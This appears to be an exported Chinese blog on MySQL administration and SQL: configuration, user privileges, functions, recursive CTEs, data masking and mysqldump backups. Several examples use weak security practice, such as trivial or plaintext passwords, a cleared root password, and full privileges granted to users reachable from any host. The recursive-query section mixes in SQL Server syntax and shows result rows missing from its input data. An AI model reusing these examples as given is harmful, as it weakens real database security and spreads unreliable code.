<h4 id="内存和性能优化"><a href="#内存和性能优化" class="headerlink" title="内存和性能优化"></a>内存和性能优化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 内存分配（根据服务器总内存调整）</span><br><span class="line">innodb_buffer_pool_size=1G       # InnoDB缓存池大小（通常占总内存50-75%）</span><br><span class="line">key_buffer_size=128M             # MyISAM索引缓存</span><br><span class="line">query_cache_size=64M             # 查询缓存大小（5.7后逐渐弃用，8.0移除）</span><br><span class="line"></span><br><span class="line"># 日志配置</span><br><span class="line">log-bin=mysql-bin                # 启用二进制日志（主从复制必须）</span><br><span class="line">expire-logs-days=7               # 二进制日志保留天数</span><br><span class="line">slow-query-log=1                 # 开启慢查询日志</span><br><span class="line">slow-query-log-file=/var/log/mysql/slow.log  # 慢查询日志路径</span><br><span class="line">long_query_time=2                # 超过2秒的查询记录到慢日志</span><br></pre></td></tr></table></figure>
<h4 id="连接与线程"><a href="#连接与线程" class="headerlink" title="连接与线程"></a>连接与线程</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">max_connections=200              # 最大连接数</span><br><span class="line">back_log=100                     # 连接队列长度</span><br><span class="line">wait_timeout=28800               # 空闲连接超时时间（秒）</span><br></pre></td></tr></table></figure>
<h4 id="服务控制"><a href="#服务控制" class="headerlink" title="服务控制"></a>服务控制</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动/停止/重启服务（systemd方式）</span></span><br><span class="line">systemctl start mysql</span><br><span class="line">systemctl stop mysql</span><br><span class="line">systemctl restart mysql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看服务状态</span></span><br><span class="line">systemctl status mysql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看端口监听</span></span><br><span class="line">netstat -tlnp | grep 3306</span><br></pre></td></tr></table></figure>
<h4 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接本地MySQL</span></span><br><span class="line">mysql -u root -p</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接远程MySQL</span></span><br><span class="line">mysql -h 192.168.1.100 -P 3306 -u user -p</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行SQL脚本</span></span><br><span class="line">mysql -u root -p &lt; script.sql</span><br></pre></td></tr></table></figure>
<h4 id="用户与权限管理"><a href="#用户与权限管理" class="headerlink" title="用户与权限管理"></a>用户与权限管理</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建用户并授权（允许从任意主机连接）</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> mydb.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看用户权限</span></span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 撤销权限</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> mydb.<span class="operator">*</span> <span class="keyword">FROM</span> <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除用户</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span> <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="查看状态与变量"><a href="#查看状态与变量" class="headerlink" title="查看状态与变量"></a>查看状态与变量</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看服务器状态</span></span><br><span class="line"><span class="keyword">SHOW</span> STATUS;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看配置变量</span></span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看InnoDB缓冲池状态</span></span><br><span class="line"><span class="keyword">SHOW</span> ENGINE INNODB STATUS;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看当前连接</span></span><br><span class="line"><span class="keyword">SHOW</span> PROCESSLIST;</span><br></pre></td></tr></table></figure>
<h4 id="逻辑备份"><a href="#逻辑备份" class="headerlink" title="逻辑备份"></a>逻辑备份</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份单个数据库</span></span><br><span class="line">mysqldump -u root -p mydb &gt; mydb_backup.sql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份所有数据库</span></span><br><span class="line">mysqldump -u root -p --all-databases &gt; all_databases_backup.sql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">恢复数据库</span></span><br><span class="line">mysql -u root -p mydb &lt; mydb_backup.sql</span><br></pre></td></tr></table></figure>
<h4 id="定期备份脚本"><a href="#定期备份脚本" class="headerlink" title="定期备份脚本"></a>定期备份脚本</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">BACKUP_DIR=&quot;/backup/mysql&quot;</span><br><span class="line">DATE=$(date +%Y%m%d)</span><br><span class="line">USER=&quot;root&quot;</span><br><span class="line">PASSWORD=&quot;password&quot;</span><br><span class="line"></span><br><span class="line">mkdir -p $BACKUP_DIR/$DATE</span><br><span class="line">mysqldump -u$USER -p$PASSWORD --all-databases &gt; $BACKUP_DIR/$DATE/all_databases.sql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除7天前的备份</span></span><br><span class="line">find $BACKUP_DIR -type d -mtime +7 -exec rm -rf &#123;&#125; \;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL数据库五【常用函数】</title>
    <url>/cnblogs.github.io/p/bb7d.html</url>
    <content><![CDATA[<h2 id="一、数学函数"><a href="#一、数学函数" class="headerlink" title="一、数学函数"></a>一、数学函数</h2><p>数学函数用于对数值进行各种运算，常见的数学函数包括：<br>● ABS(x)：返回x的绝对值。例如，SELECT ABS(-5); 返回5。<br>● ROUND(x, y)：将x四舍五入到小数点后y位。如 SELECT ROUND(3.756, 2); 返回3.76。<br>● CEIL(x)：向上取整。例如，SELECT CEIL(4.2); 返回5。<br>● FLOOR(x)：向下取整。如 SELECT FLOOR(4.8); 返回4。<br>● MOD(x, y)：返回x除以y的余数。例如，SELECT MOD(10, 3); 返回1。<br>这些函数在数据分析和处理中，能够对数值进行精确控制，满足各种计算需求。</p>
<h2 id="二、字符串函数"><a href="#二、字符串函数" class="headerlink" title="二、字符串函数"></a>二、字符串函数</h2><p>字符串函数用于处理文本数据，提供了丰富的文本操作功能，常用的字符串函数包括：<br>● CONCAT(s1, s2,…)：将多个字符串连接成一个字符串。例如，SELECT CONCAT(‘Hello’, ‘, ‘World’); 返回”Hello World”。<br>● UPPER(s)：将字符串s中的所有字母转换为大写。如 SELECT UPPER(‘hello’); 返回”HELLO”。<br>● LOWER(s)：将字符串s中的所有字母转换为小写。例如，SELECT LOWER(‘WORLD’); 返回”world”。<br>● SUBSTRING(s, n, len)：从字符串s的第n个位置开始提取长度为len的子串。如 SELECT SUBSTRING(‘Hello World’, 7, 5); 返回”World”。<br>● TRIM(s)：去除字符串s前后的空格。例如，SELECT TRIM(‘ Hello ‘); 返回”Hello”。<br>这些函数使得文本数据的处理更加灵活和高效，适用于各种文本操作场景。</p>
<h2 id="三、日期时间函数"><a href="#三、日期时间函数" class="headerlink" title="三、日期时间函数"></a>三、日期时间函数</h2><p>日期时间函数用于处理日期和时间数据，支持多种日期和时间的运算与格式化，常见的日期时间函数包括：<br>● NOW()：返回当前系统的日期和时间。例如，SELECT NOW(); 返回当前日期时间，如”2025-06-19 15:30:00”。<br>● CURDATE()：返回当前系统的日期。如 SELECT CURDATE(); 返回”2025-06-19”。<br>● YEAR(d)：提取日期d中的年份。例如，SELECT YEAR(‘2025-06-19’); 返回2025。<br>● DATEDIFF(d1, d2)：计算两个日期之间的天数差。如 SELECT DATEDIFF(‘2025-06-20’, ‘2025-06-19’); 返回1。<br>● DATE_FORMAT(d, format)：将日期d格式化为指定的格式。例如，SELECT DATE_FORMAT(NOW(), ‘%Y年%m月%d日’); 返回”2025年06月19日”。<br>这些函数在时间相关的数据分析和报表生成中，具有重要作用。</p>
<h2 id="四、聚合函数"><a href="#四、聚合函数" class="headerlink" title="四、聚合函数"></a>四、聚合函数</h2><p>聚合函数用于对一组数据进行统计分析，常用于数据汇总和报表生成，常见的聚合函数包括：<br>● COUNT(<em>)：统计行数。例如，SELECT COUNT(</em>) FROM table_name; 返回表中的总行数。<br>● SUM(column)：计算指定列的总和。如 SELECT SUM(salary) FROM employees; 返回员工工资总和。<br>● AVG(column)：计算指定列的平均值。例如，SELECT AVG(salary) FROM employees; 返回员工平均工资。<br>● MAX(column)：返回指定列中的最大值。如 SELECT MAX(salary) FROM employees; 返回最高工资。<br>● MIN(column)：返回指定列中的最小值。例如，SELECT MIN(salary) FROM employees; 返回最低工资。<br>这些函数能够对大量数据进行快速统计，提供数据分析和决策支持。</p>
<h2 id="五、其他常用函数"><a href="#五、其他常用函数" class="headerlink" title="五、其他常用函数"></a>五、其他常用函数</h2><p>除了上述几类函数，MySQL还提供了一些其他实用的函数，如：<br>● IF(condition, value1, value2)：根据条件返回不同的值。例如，SELECT IF(10 &gt; 5, ‘True’, ‘False’); 返回”True”。<br>● CASE WHEN… THEN… ELSE… END：实现复杂的条件判断。适用于需要根据多个条件返回不同结果的情况。<br>● TRIM(s)：去除字符串前后的空格，增强数据清洗的灵活性。</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL数据库四【高级语句】</title>
    <url>/cnblogs.github.io/p/30041.html</url>
    <content><![CDATA[<h2 id="递归查询"><a href="#递归查询" class="headerlink" title="递归查询"></a>递归查询</h2><h3 id="WITH-CTE-AS（）"><a href="#WITH-CTE-AS（）" class="headerlink" title="WITH CTE AS（）"></a>WITH CTE AS（）</h3><p>递归的常见形式</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WITH</span> CTE <span class="keyword">AS</span> (</span><br><span class="line">  <span class="keyword">SELECT</span> column1,column2... <span class="keyword">FROM</span> tablename <span class="keyword">WHERE</span> conditions</span><br><span class="line">  <span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line">  <span class="keyword">SELECT</span> column1,column2... <span class="keyword">FROM</span> tablename</span><br><span class="line">  <span class="keyword">INNER</span> <span class="keyword">JOIN</span> CTE <span class="keyword">ON</span> conditions</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>递归查询示例</p>
</blockquote>
<p>创建测试数据，有一个员工表Employee，ManagerID是UserID的父节点，这是一个非常简单的层次结构模型</p>
<table>
<thead>
<tr>
<th>UserID</th>
<th>ManagerID</th>
<th>Name</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>-1</td>
<td>Boss</td>
</tr>
<tr>
<td>11</td>
<td>1</td>
<td>A1</td>
</tr>
<tr>
<td>12</td>
<td>1</td>
<td>A2</td>
</tr>
<tr>
<td>13</td>
<td>1</td>
<td>A3</td>
</tr>
<tr>
<td>111</td>
<td>11</td>
<td>B1</td>
</tr>
<tr>
<td>112</td>
<td>11</td>
<td>B2</td>
</tr>
<tr>
<td>113</td>
<td>12</td>
<td>B3</td>
</tr>
</tbody></table>
<p>查询每个User的的直接上级Manager</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WITH</span> CTE  <span class="keyword">AS</span>(</span><br><span class="line"> <span class="keyword">SELECT</span> UserID,ManagerID,Name,Name <span class="keyword">AS</span> ManagerName</span><br><span class="line"> <span class="keyword">FROM</span> dbo.Employee</span><br><span class="line"> <span class="keyword">WHERE</span> ManagerID<span class="operator">=</span><span class="number">-1</span></span><br><span class="line"> <span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"> <span class="keyword">SELECT</span> c.UserID,c.ManagerID,c.Name,p.Name <span class="keyword">AS</span> ManagerName</span><br><span class="line"> <span class="keyword">FROM</span> CTE P</span><br><span class="line"> <span class="keyword">INNER</span> <span class="keyword">JOIN</span> dbo.Employee c  <span class="keyword">ON</span> p.UserID<span class="operator">=</span>c.ManagerID</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UserID,ManagerID,Name,ManagerName <span class="keyword">FROM</span> CTE</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<table>
<thead>
<tr>
<th>UserID</th>
<th>ManagerID</th>
<th>Name</th>
<th>ManagerName</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>-1</td>
<td>Boss</td>
<td>Boss</td>
</tr>
<tr>
<td>11</td>
<td>1</td>
<td>A1</td>
<td>Boss</td>
</tr>
<tr>
<td>12</td>
<td>1</td>
<td>A2</td>
<td>Boss</td>
</tr>
<tr>
<td>13</td>
<td>1</td>
<td>A3</td>
<td>Boss</td>
</tr>
<tr>
<td>121</td>
<td>12</td>
<td>C1</td>
<td>A2</td>
</tr>
<tr>
<td>111</td>
<td>11</td>
<td>B1</td>
<td>A1</td>
</tr>
<tr>
<td>112</td>
<td>11</td>
<td>B2</td>
<td>A1</td>
</tr>
</tbody></table>
<p>我们来解读一下上面的代码</p>
<ul>
<li>查询ManagerID&#x3D;-1，作为根节点，这是递归查询的起始点。</li>
<li>迭代公式是 UNION ALL 下面的查询语句。在查询语句中调用中CTE，而查询语句就是CTE的组成部分，即 “自己调用自己”，这就是递归的真谛所在。所谓迭代，是指每一次递归都要调用上一次查询的结果集，UNION ALL是指每次都把结果集并在一起。</li>
<li>迭代公式利用上一次查询返回的结果集执行特定的查询，直到CTE返回NULL或达到最大的迭代次数，默认值是32。最终的结果集是迭代公式返回的各个结果集的并集，求并集是由UNION ALL 子句定义的，并且只能使用UNION ALL</li>
</ul>
<blockquote>
<p>查询路径</p>
</blockquote>
<p>下面我们通过层次结构查询子节点到父节点的PATH，我们对上面的代码稍作修改：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">WITH</span> CTE  <span class="keyword">AS</span>(</span><br><span class="line">  <span class="keyword">SELECT</span> UserID,ManagerID,Name,<span class="built_in">CAST</span>(Name <span class="keyword">AS</span> NVARCHAR(MAX)) <span class="keyword">AS</span> LPath </span><br><span class="line">  <span class="keyword">FROM</span> dbo.Employee</span><br><span class="line">  <span class="keyword">WHERE</span> ManagerID<span class="operator">=</span><span class="number">-1</span></span><br><span class="line">  <span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line">  <span class="keyword">SELECT</span> c.UserID,c.ManagerID,c.Name,p.LPath<span class="operator">+</span><span class="string">&#x27;-&gt;&#x27;</span><span class="operator">+</span>c.Name <span class="keyword">AS</span> LPath</span><br><span class="line">  <span class="keyword">FROM</span> CTE P</span><br><span class="line">  <span class="keyword">INNER</span> <span class="keyword">JOIN</span> dbo.Employee c  <span class="keyword">ON</span> p.UserID<span class="operator">=</span>c.ManagerID</span><br><span class="line"> )</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UserID,ManagerID,Name,LPath <span class="keyword">FROM</span> CTE</span><br></pre></td></tr></table></figure>
<p>其中CAST(Name AS NVARCHAR(MAX))是将Name的长度设置为最大，防止字段过长超出字段长度。具体结果如下：</p>
<table>
<thead>
<tr>
<th>UserID</th>
<th>ManagerID</th>
<th>Name</th>
<th>LPath</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>-1</td>
<td>Boss</td>
<td>Boss</td>
</tr>
<tr>
<td>11</td>
<td>1</td>
<td>A1</td>
<td>Boss -&gt; A1</td>
</tr>
<tr>
<td>12</td>
<td>1</td>
<td>A2</td>
<td>Boss -&gt; A2</td>
</tr>
<tr>
<td>13</td>
<td>1</td>
<td>A3</td>
<td>Boss -&gt; A3</td>
</tr>
<tr>
<td>121</td>
<td>12</td>
<td>C1</td>
<td>Boss -&gt; A2 -&gt; C1</td>
</tr>
<tr>
<td>111</td>
<td>11</td>
<td>B1</td>
<td>Boss -&gt; A1 -&gt; B1</td>
</tr>
<tr>
<td>112</td>
<td>11</td>
<td>B2</td>
<td>Boss -&gt; A1 -&gt; B2</td>
</tr>
</tbody></table>
<h2 id="DCL语句"><a href="#DCL语句" class="headerlink" title="DCL语句"></a>DCL语句</h2><p>数据控制语言 (Data Control Language) 在SQL语言中，是一种可对数据访问权进行控制的指令，它可以控制特定用户账户对数据表、查看表、存储程序、用户自定义函数等数据库对象的控制权。由 GRANT 和 REVOKE 两个指令组成。</p>
<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><p>mysql数据库的用户都在mysql数据库下面的user表中</p>
<h4 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a>查看用户</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>,host,plugin,authentication_string <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>
<h4 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建一个用户root1，只能在本机登录（localhost）</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;root1&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建一个用户root2，可以在任何主机（%）登录</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;root2&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 指定加密方式，增加用户</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;root3&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">with</span> mysql_native_password <span class="keyword">by</span> <span class="string">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 删除root1</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> root1<span class="variable">@localhost</span>;</span><br></pre></td></tr></table></figure>
<h3 id="密码管理"><a href="#密码管理" class="headerlink" title="密码管理"></a>密码管理</h3><h4 id="修改用户密码"><a href="#修改用户密码" class="headerlink" title="修改用户密码"></a>修改用户密码</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 修改root2的密码</span></span><br><span class="line"> <span class="keyword">alter</span> <span class="keyword">user</span> <span class="string">&#x27;root2&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;456&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 如果想用该root2用户连接上mysql服务端的话，我们的密码修改时应该是：</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">user</span> <span class="string">&#x27;root2&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">with</span> mysql_native_password <span class="keyword">by</span> <span class="string">&#x27;456&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="设置管理员（root）密码"><a href="#设置管理员（root）密码" class="headerlink" title="设置管理员（root）密码"></a>设置管理员（root）密码</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 清空密码</span></span><br><span class="line">use mysql; </span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> authentication_string<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;#设置提root用户的密码为‘’，本地，远程</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 设置密码</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">user</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;Root12345&#x27;</span>;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">user</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;Root12345&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h3><h4 id="查看用户权限"><a href="#查看用户权限" class="headerlink" title="查看用户权限"></a>查看用户权限</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看&#x27;root2&#x27;，&#x27;root3&#x27;及&#x27;root&#x27;权限</span></span><br><span class="line"><span class="keyword">show</span> grants <span class="keyword">for</span> <span class="string">&#x27;root2&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"><span class="keyword">show</span> grants <span class="keyword">for</span> <span class="string">&#x27;root3&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"><span class="keyword">show</span> grants <span class="keyword">for</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 给&#x27;root2&#x27;分配，增加、删除、修改、查询表的权限</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">insert</span>,<span class="keyword">delete</span>,<span class="keyword">update</span>,<span class="keyword">select</span> <span class="keyword">on</span> gjh.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;root2&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 给&#x27;root3&#x27;分配所有权限</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;root3&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="撤销授权"><a href="#撤销授权" class="headerlink" title="撤销授权"></a>撤销授权</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 撤消&#x27;root2&#x27;的权限</span></span><br><span class="line"><span class="keyword">revoke</span> <span class="keyword">all</span> <span class="keyword">on</span> gjh.<span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;root2&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="数据脱敏"><a href="#数据脱敏" class="headerlink" title="数据脱敏"></a>数据脱敏</h2><h3 id="原生SQL函数脱敏"><a href="#原生SQL函数脱敏" class="headerlink" title="原生SQL函数脱敏"></a>原生SQL函数脱敏</h3><h4 id="1、部分隐藏-替换"><a href="#1、部分隐藏-替换" class="headerlink" title="1、部分隐藏&#x2F;替换"></a>1、部分隐藏&#x2F;替换</h4><p>使用字符串函数对敏感字段进行处理：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 手机号脱敏（保留前3位和后4位）</span></span><br><span class="line"><span class="keyword">SELECT</span> CONCAT(<span class="keyword">LEFT</span>(phone, <span class="number">3</span>), <span class="string">&#x27;****&#x27;</span>, <span class="keyword">RIGHT</span>(phone, <span class="number">4</span>)) <span class="keyword">AS</span> masked_phone <span class="keyword">FROM</span> users;</span><br><span class="line"><span class="comment">-- 姓名脱敏（保留首尾字符）</span></span><br><span class="line"><span class="keyword">SELECT</span> CONCAT(<span class="keyword">LEFT</span>(name, <span class="number">1</span>), <span class="string">&#x27;***&#x27;</span>, <span class="keyword">RIGHT</span>(name, <span class="number">1</span>)) <span class="keyword">AS</span> masked_name <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>
<h4 id="2、正则替换"><a href="#2、正则替换" class="headerlink" title="2、正则替换"></a>2、正则替换</h4><p>使用REGEXP_REPLACE（MySQL 8.0+）隐藏敏感片段：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 身份证号脱敏（保留前6位和后4位）</span></span><br><span class="line"><span class="keyword">SELECT</span> REGEXP_REPLACE(id_card, <span class="string">&#x27;(.&#123;6&#125;).*(.&#123;4&#125;)&#x27;</span>, <span class="string">&#x27;\\1****\\2&#x27;</span>) <span class="keyword">AS</span> masked_id <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>
<h3 id="视图封装脱敏数据"><a href="#视图封装脱敏数据" class="headerlink" title="视图封装脱敏数据"></a>视图封装脱敏数据</h3><p>通过视图暴露脱敏后的数据，保护底层原始数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> masked_customers <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">  id,</span><br><span class="line">  CONCAT(<span class="keyword">LEFT</span>(name, <span class="number">1</span>), <span class="string">&#x27;***&#x27;</span>) <span class="keyword">AS</span> name,  <span class="comment">-- 姓名脱敏</span></span><br><span class="line">  CONCAT(<span class="keyword">LEFT</span>(email, <span class="number">3</span>), <span class="string">&#x27;***@***.com&#x27;</span>) <span class="keyword">AS</span> email  <span class="comment">-- 邮箱脱敏</span></span><br><span class="line"><span class="keyword">FROM</span> customers;</span><br><span class="line"><span class="comment">-- 回收原表权限，仅开放视图权限</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> customers <span class="keyword">FROM</span> app_user;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> masked_customers <span class="keyword">TO</span> app_user;</span><br></pre></td></tr></table></figure>
<h3 id="加密存储敏感数据"><a href="#加密存储敏感数据" class="headerlink" title="加密存储敏感数据"></a>加密存储敏感数据</h3><p>对高敏感字段（如银行卡号）进行加密存储：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 使用AES加密存储（MySQL 5.7+）</span></span><br><span class="line"><span class="keyword">INSERT INTO</span> payments (card_no) </span><br><span class="line"><span class="keyword">VALUES</span> (AES_ENCRYPT(<span class="string">&#x27;622588****1234&#x27;</span>, <span class="string">&#x27;encryption_key&#x27;</span>));</span><br><span class="line"><span class="comment">-- 查询时解密</span></span><br><span class="line"><span class="keyword">SELECT</span> AES_DECRYPT(card_no, <span class="string">&#x27;encryption_key&#x27;</span>) <span class="keyword">AS</span> decrypted_card <span class="keyword">FROM</span> payments;</span><br></pre></td></tr></table></figure>

<h2 id="MySQLDump"><a href="#MySQLDump" class="headerlink" title="MySQLDump"></a>MySQLDump</h2><h3 id="导出整个数据库"><a href="#导出整个数据库" class="headerlink" title="导出整个数据库"></a>导出整个数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -u root -p mydb &gt; mydb_backup.sql</span><br></pre></td></tr></table></figure>
<h3 id="导出指定表"><a href="#导出指定表" class="headerlink" title="导出指定表"></a>导出指定表</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -u root -p mydb users &gt; mydb_users_backup.sql</span><br></pre></td></tr></table></figure>
<h3 id="只导出表结构，不导出数据"><a href="#只导出表结构，不导出数据" class="headerlink" title="只导出表结构，不导出数据"></a>只导出表结构，不导出数据</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -u root -p -d mydb &gt; mydb_structure.sql</span><br></pre></td></tr></table></figure>
<h3 id="导入数据"><a href="#导入数据" class="headerlink" title="导入数据"></a>导入数据</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u root -p mydb &lt; mydb_backup.sql</span><br></pre></td></tr></table></figure>

